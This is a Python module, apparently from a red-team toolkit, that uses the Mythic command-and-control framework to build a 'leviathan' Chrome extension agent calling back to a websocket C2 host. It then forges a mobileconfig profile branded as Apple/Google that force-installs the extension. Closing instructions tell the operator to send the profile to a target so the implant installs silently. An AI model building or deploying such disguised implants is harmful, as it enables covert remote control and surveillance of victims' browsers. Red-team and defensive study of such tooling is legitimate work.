import asyncio, os
import subprocess
from .Utilities import *


def mobile_ext():
    temp = "./Templates/MobileConfigChrome/"
    payload = "./Payloads/MobileConfigChrome_Payload"

    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        # define what our payload should be
        print("[+] Creating new leviathan payload")
        resp = await mythic.create_payload(mythic=mythic_instance,
                                           payload_type_name="leviathan",
                                           c2_profiles=[
                                               {
                                                   "c2_profile": "leviathan-websocket",
                                                   "c2_profile_parameters": {
                                                       "callback_host": mythic_ws_callback_host,
                                                       "callback_interval": mythic_ws_callback_interval,
                                                       "callback_port": mythic_ws_callback_port}
                                               }
                                           ],
                                           build_parameters=[
                                               {"name": "update_url", "value": mythic_update_url},
                                               {"name": "url", "value": "http://www.google.com"},
                                               {"name": "version", "value": "1.0"}
                                           ],
                                           description="Mobile_Config",
                                           operating_system="chrome",
                                           # if we want to only include specific commands, put them here:
                                           # commands=["cmd1", "cmd2", "cmd3"],
                                           include_all_commands=True,
                                           return_on_complete=True,
                                           filename="Mobile_Config_Plugin.zip")
        if resp["build_phase"] == "success":

            print("[*] Downloading leviathan payload")
            # payload_contents is now the raw bytes of the payload
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            with open(payload + "/Mobile_Config_Plugin.zip", "wb") as f:
                f.write(payload_contents)  # write out to disk

            print("[*] Creating Mobile Payload")

            os.system("unzip " + payload + "/Mobile_Config_Plugin.zip -d " + payload + "/temp/")

            os.system("chmod +x " + payload + "/AppID.sh")
            subprocess.call(payload + "/AppID.sh")
            appID = subprocess.getoutput("cat " + payload + "/temp/AppIDValue")

            templateString1 = "PAYLOAD_ID"
            # templateString2 = "DISPLAY_NAME"
            templateString3 = "EXTENSION_APPID"
            templateString4 = "UPDATE_URL"
            templateString5 = "PAYLOADORG"
            fin = open(payload + "/chrome.mobileconfig", "rt")
            data = fin.read()
            data = data.replace(templateString1, "com.apple.browser.chrome")
            # data = data.replace(templateString2, "Chrome Configuration")
            data = data.replace(templateString3,
                                appID)  # replaces wtih appID which looks like omaggmbmbjlbbhjjchidignmmdlmdhbo
            data = data.replace(templateString4, mythic_update_url)
            data = data.replace(templateString5, "Google")
            fin.close()
            fin = open(payload + "/chrome.mobileconfig", "wt")
            fin.write(data)
            fin.close()

            templateString6 = "EXT_URL"
            fin = open(payload + "/manifest.xml", "rt")
            data = fin.read()
            data = data.replace(templateString6, mythic_extension_file)
            data = data.replace(templateString3, appID)
            fin.close()
            fin = open(payload + "/manifest.xml", "wt")
            fin.write(data)
            fin.close()

            os.chdir(payload)
            os.system("zip -ur Mobile_Config_Plugin.zip manifest.xml")
            print("[+] Built Mobile_Config_Plugin.zip")
            print("To setup: \n"
                  "1) Place the Mobile_Config_Plugin.zip on the update server and unzip. You want to host the files within the folder \n"
                  "2) Send the chrome.mobileconfig to the target \n"
                  "3) After the target installs the profile on the next opening of Chrome the extension will download and install on target \n"
                  "4) This method requires the target to be domain joined. Either Google/Apple changed behavior \n"
                  "5) The IP will show loopback (127.0.0.1), this is expected behavior")
        else:
            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
